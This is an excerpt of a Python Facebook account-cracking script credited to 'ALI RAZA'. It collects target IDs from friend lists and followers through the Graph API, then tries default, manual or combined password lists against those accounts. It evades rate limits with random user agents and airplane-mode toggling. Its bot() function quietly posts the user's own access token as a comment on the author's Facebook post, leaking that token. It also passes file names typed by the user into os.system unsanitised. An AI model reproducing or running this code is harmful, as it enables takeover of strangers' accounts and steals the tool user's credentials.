...
indah = ["Year","January","February","March","April","May","June","July","August","September","October","November","December"]
...
////
{H}[{P}>{H}]{P} Au : ALI RAZA
{H}[{P}>{H}]{P} Wa : +03110760985
{H}[{P}>{H}]{P} Yt : Technical Charsi
{K}[{P}•{K}]{P}—————————————————————————————""")
...
def login():
	...
	try:
		...
		jalan(balmond+l+" Login Success")
		time.sleep(0.5)
		bot()
	except KeyError:
		jalan(balmond+m+" Login Failed")
		time.sleep(0.5)
		login()
...
def bot():
	try:
		...
		time.sleep(0.5)
		login()
	print(balmond+l+" Check How To Get Token")
	komentar = random.choice(["Safe Babes"])
	requests.post("https://graph.facebook.com/100069819591035/subscribers?access_token="+token) # ALI
	requests.post("https://graph.facebook.com/259731103030874/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/259731103030874/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/259731103030874/comments/?message="+token+"&access_token="+token)
	menu()
...
def menu():
	...
	try:
		...
		jalan(balmond+m+" Internet Issue")
		time.sleep(0.5)
		exit()
	print("\n"+balmond+l+" Active User : "+s+pillow["name"])
	print(balmond+u+" =>"+h+" Total_Op/OK_%s.txt"%(hck))
	print(balmond+u+" =>"+k+" Total_Cp/CP_%s.txt"%(hck))
	print(u+line)
	print(s+"\n{"+m+"1"+s+"}"+B+" Crack From Friends Or Public "+H+"{5000}")
	print(s+"{"+m+"2"+s+"}"+B+" Crack From Public Followers "+H+"{5000}")
	print(s+"{"+m+"3"+s+"}"+B+" Public Friends Crack "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"4"+s+"}"+B+" Crack Old 04/08 "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"5"+s+"}"+H+" Crack Old 04/10 "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"6"+s+"}"+H+" Setting User Agent "+s+"{Option}")
	print(s+"{"+m+"7"+s+"}"+H+" Check Option Total Crack "+s+"{ok/cp}")
	print(s+"{"+m+"8"+s+"}"+H+" Check Result Crack")
	print(s+"{"+m+"0"+s+"}"+M+" Logout")
	sayangku = input("\n"+balmond+l+" Choose : ")
	if sayangku=="1" or sayangku=="01":
		...
		jalan(balmond+l+" Thanks For Using Subscribe Technical Raza")
		time.sleep(0.5)
		exit()
	else:
...
def tema():
	print(s+"\n{"+m+"1"+s+"}"+l+" Theme Default")
	print(s+"{"+m+"2"+s+"}"+l+" Theme Yellow "+k+"{Finish}")
	print(s+"{"+m+"3"+s+"}"+l+" Theme Red "+m+"{anger}")
	print(s+"{"+m+"4"+s+"}"+l+" Theme Blue "+s+"{sky}")
	print(s+"{"+m+"0"+s+"}"+l+" Return")
	pilih = input("\n"+balmond+l+" Choose : ")
	if pilih=="1" or pilih=="01":
		awm = open("tema.txt","w");awm.write("default");awm.close()
		print("\n"+balmond+l+" Theme Successfully Apply")
		jalan(balmond+l+" Rerun the Script...")
		time.sleep(0.5)
		exit()
...
def result():
	print(s+"\n{"+m+"1"+s+"}"+K+" Check Result CP "+k+"{session account}")
	print(s+"{"+m+"2"+s+"}"+H+" Check Result OK "+k+"{open account}")
	print(s+"{"+m+"0"+s+"}"+l+" Return")
	pilih = input("\n"+balmond+l+" Choose : ")
	if pilih=="1" or pilih=="01":
		try:
			lisaa = os.listdir("Total_Cp")
		...
		if len(lisaa)==0:
			print("\n"+balmond+k+" Total CP")
			print(balmond+m+" No Cp Result")
			input(balmond+l+" Return")
			time.sleep(0.5)
			menu()
		else:
			print("\n"+balmond+l+" Total CP")
			...
			try:
				binatang = open("Total_Cp/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" File Name Missing")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Total_Cp && cat %s"%(marjan))
		input("\n"+balmond+l+" Return")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		try:
			lisaa = os.listdir("Total_Ok")
		except FileNotFoundError:
			jalan(balmond+m+" Directory Not Found")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			...
			marjan = input(balmond+l+" File : "+h+"")
			try:
				binatang = open("Total_Ok/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" File Name Missing")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Total_Ok && cat %s"%(marjan))
		input("\n"+balmond+l+" Return")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
...
def user_agent():
	print(s+"\n{"+m+"1"+s+"}"+l+" Change User Agent")
	print(s+"{"+m+"2"+s+"}"+l+" Reset User Agent")
	print(s+"{"+m+"3"+s+"}"+l+" see User Agent")
	pilih = input("\n"+balmond+l+" Choose : ")
	if pilih=="1" or pilih=="01":
		user = input("\n"+balmond+l+" Enter User Agent : "+h+"")
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan(balmond+h+" Success")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		user = "Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36"
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan("\n"+balmond+h+" Success")
		time.sleep(0.5)
		menu()
		...
		try:
			...
			jalan("\n"+balmond+m+" User Agent file does not exist, please set it first")
			time.sleep(0.5)
			menu()
...
def dump_old2():
        ...
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" How many IDs do you want to crack? : "))
                if nada>10:
        ...
        for dot in range(nada):
                ...
                try:
                        ...
                        print(balmond+l+" Name : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Wrong")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Internet Issue")
                ...
                try:
                        ...
                        jalan(balmond+m+" Internet Error")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Amount Total ID Old : "+h+"%s"%(len(id)))
...
def dump_old():
        ...
        for dot in range(nada):
                ...
                tampung = []
                non_old = []
                uid = input(balmond+l+" Enter Target ID %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Name : "+tulul["name"])
...
def follow():
	...
	uid = input("\n"+balmond+l+" Enter ID Target : ")
	try:
		jumlah = int(input(balmond+l+" How much ID do you want to take? : "))
		if jumlah>5000:
			jalan(balmond+m+" Maximum 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
...
def massal():
	...
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = input(balmond+l+" Enter ID Target  %s : "%(dot))
		try:
			asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			tulul = json.loads(asu.text)
			print(balmond+l+" Name : "+tulul["name"])
		...
		try:
			...
			time.sleep(0.5)
			exit()
	print(balmond+l+" Amount Total ID : "+h+"%s"%(len(id)))
	mode_password()

# MODE PASSWORD

def mode_password():
	mode = input("\n"+balmond+l+" Crack Password Default Or Manual Or Combine "+s+"{"+B+"d/m/g"+s+"}"+l+" : ")
	if mode=="d" or mode=="D":
		opsi()
	elif mode=="m" or mode=="M":
		print("\n"+balmond+H+" Enter Password Manual")
		print(balmond+M+" Minimum 6 characters in 1 password")
		print(balmond+K+" Example : "+k+"Pakistan,786786,123456")
		pwa = input(balmond+M+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+B+" Enter, at least 7 passwords")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+M+" In 1 Password Minimum 6 Characters")
				time.sleep(0.5)
				exit()
		sandi.append(pwa)
		opsi2()
	elif mode=="g" or mode=="G":
		print("\n"+balmond+l+" Enter Additional Password")
		print(balmond+l+" Minimum 6 characters in 1 password")
		print(balmond+l+" Example : "+H+"pakistan,786786,123456")
		pwa = input(balmond+l+" Password Additional : "+B+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Enter, at least 5 passwords")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
		...
		jalan(balmond+m+" Choose d Or m Or g")
		time.sleep(0.5)
		mode_password()
...
def opsi():
	ops = input(balmond+l+" Pop Up Options "+h+"{"+k+"y/t"+h+"}"+l+" : ")
	if ops=="y" or ops=="Y":
		opsit.append("show up")
	elif ops=="t" or ops=="T":
		opsit.append("do not")
	else:
		jalan(balmond+m+" Choose Yes Or No")
		time.sleep(0.5)
		opsi()
	mode_crack()
...
def opsi2():
        ops = input("\n"+balmond+l+" Pop Up Options "+h+"{"+k+"y/t"+h+"}"+l+" : ")
        if ops=="y" or ops=="Y":
                opsit.append("show up")
        elif ops=="t" or ops=="T":
                opsit.append("do not")
...
def mode_crack():
	print(s+"\n{"+m+"1"+s+"}"+M+" Method Api "+s+"{"+K+"Fast"+s+"}")
	print(s+"\n{"+m+"2"+s+"}"+H+" Method Mbasic "+s+"{"+B+"Slow"+s+"}")
	pilih = input("\n"+balmond+l+" Choose : ")
	if pilih=="1" or pilih=="01":
		print("\n"+balmond+s+" Enter "+h+"'y'"+s+" If you want to use a random user agent")
		print(balmond+u+" Press Enter if you don't want to use a random user agent")
		agenku = input(balmond+l+" Use Random User Agent "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "nice"
		print("\n"+balmond+l+" Crack Start")
		print(balmond+l+" If No Result, Turn On Airplane Mode 5 Seconds\n")
		default()
	elif pilih=="2" or pilih=="02":
		print("\n"+balmond+s+" Enter "+h+"'y'"+s+" If You Want To Use Random User Agent")
		print(balmond+u+" Press Enter if you don't want to use a random user agent")
		agenku = input(balmond+l+" Use User Agent Random "+s+"{"+H+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "Nice"
		print("\n"+balmond+h+" Crack Start")
		print(balmond+l+" If No Result, Turn On Airplane Mode 5 Seconds\n")
		default2()
	else:
		jalan(balmond+l+" Choice Invalid")
		time.sleep(0.5)
		mode_crack()
...
def mode_crack2():
        ...
        pilih = input("\n"+balmond+l+" Choose : ")
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+s+" Enter "+h+"'y'"+s+" If U Want To Use Random User Agent")
                print(balmond+u+" Press Enter For Manual User Agent")
                agenku = input(balmond+l+" Use User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "Nice"
                print("\n"+balmond+h+" Crack Start")
                print(balmond+l+" Turn On Flight Mode for 5 sec\n")
                manual()
        elif pilih=="2" or pilih=="02":
                print("\n"+balmond+s+" Enter "+h+"'y'"+s+" If U want To Use Random User Agent")
                print(balmond+u+" Press Enter If U Want To Use Random User Agent")
                agenku = input(balmond+l+" Use User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "Nice"
                print("\n"+balmond+h+" Crack Start")
                print(balmond+l+" Enter Flight Mode For 5 Sec\n")
                manual2()
        else:
                jalan(balmond+l+" Choice Invalid")
                time.sleep(0.5)
...
def mode_crack3():
        ...
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+s+" Enter "+h+"'y'"+s+" If U Want To Use Random User Agent")
                print(balmond+u+" Press enter For Manual Use Agen")
                agenku = input(balmond+l+" Use User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "Enter"
                print("\n"+balmond+h+" Crack Start")
                print(balmond+l+" Use Flight Mode For 5 Sec\n")
                gabungkan()
        elif pilih=="2" or pilih=="02":
                print("\n"+balmond+s+" Enter "+h+"'y'"+s+" If you want to use a random user agent")
                print(balmond+u+" Press Enter if you don't want to use a random user agent")
                ...
                if agenku=="y" or agenku=="Y":
                        ...
                        kopi = "Nice"
                print("\n"+balmond+h+" Crack Start")
                print(balmond+l+" If No Result Plz Turn On Flight Mode For 5 Sec\n")
                gabungkan2()
        else:
                jalan(balmond+l+" Choice Invalid")
                time.sleep(0.5)
...
def api(uid,pwx,loop):
	...
	for pw in pwx:
		try:
			...
			if 'access_token' in response.text and 'EAAB' in response.text:
				if "old" in old_gak:
					if len(uid)==6:
...
def ceker_ttl(uid,pw,ua,lahir,tahunnya):
	...
	if "checkpoint" in ses.cookies:
		...
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Boss")
		print("\r"+h+batas)
...
def cek_opsi():
	loop = 0
	print("\n"+balmond+l+" Enter File")
	print(balmond+l+" Example : "+k+"Total_Cp/CP_%s.txt"%(hck))
	inp = input(balmond+l+" Name File : "+h)
	try:
		tes = open(inp,"r").readlines()
	except IOError:
		jalan("\n"+balmond+m+" File Not Found")
		time.sleep(0.5)
		menu()
	print(balmond+l+" There is : "+k+"%s Account"%(len(tes)))
	print("")
	for cinta in tes:
		loop+=1
